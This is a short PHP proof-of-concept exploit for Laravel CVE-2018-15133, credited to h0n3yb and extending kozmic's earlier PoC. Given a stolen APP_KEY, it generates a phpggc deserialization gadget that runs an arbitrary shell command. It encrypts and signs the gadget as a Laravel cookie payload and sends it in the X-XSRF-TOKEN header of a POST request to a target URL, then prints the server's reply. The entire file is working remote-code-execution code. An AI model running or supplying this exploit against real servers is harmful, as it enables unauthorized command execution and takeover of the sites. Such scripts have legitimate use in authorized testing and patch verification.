#!/usr/bin/env php
<?php
/**
 * Extended RCE PoC (w/ phpggc and cURL) for Laravel CVE-2018-15133
 * Author: h0n3yb
 * Credit @kozmic for developing the original PoC
 * https://github.com/kozmic/laravel-poc-CVE-2018-15133
 */

echo "Extended RCE PoC for CVE-2018-15133\n\n";
if ($argc < 4 )
{
    echo "Usage: " . $argv[0] . " <base64encoded_APP_KEY> <command> <target>" . PHP_EOL;
    exit();
}

$key = $argv[1];
$value = $argv[2];
$target = $argv[3];

$cipher = 'AES-256-CBC';

$value = shell_exec('/usr/bin/phpggc Laravel/RCE1 system ' . escapeshellarg($value) . ' -b'); //generate base64-encoded payload, change phpggc command here if needed

$iv = random_bytes(openssl_cipher_iv_length($cipher));

$value = \openssl_encrypt(
    base64_decode($value), $cipher, base64_decode($key), 0, $iv
);

if ($value === false) {
    exit("Could not encrypt the data.");
}

$iv = base64_encode($iv);
$mac = hash_hmac('sha256', $iv.$value, base64_decode($key));

$json = json_encode(compact('iv', 'value', 'mac'));

if (json_last_error() !== JSON_ERROR_NONE) {
    echo "Could not json encode data." . PHP_EOL;
    exit();
}

$encodedPayload = base64_encode($json);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt($ch, CURLOPT_POST, 1);
$header = ['X-XSRF-TOKEN: '.$encodedPayload];
curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close ($ch);

$limited = strpos($server_output, ' ', 1000); //increase this number for more output

echo "[+] SERVER RESPONSE [+]: " . substr($server_output,0,$limited) . PHP_EOL;
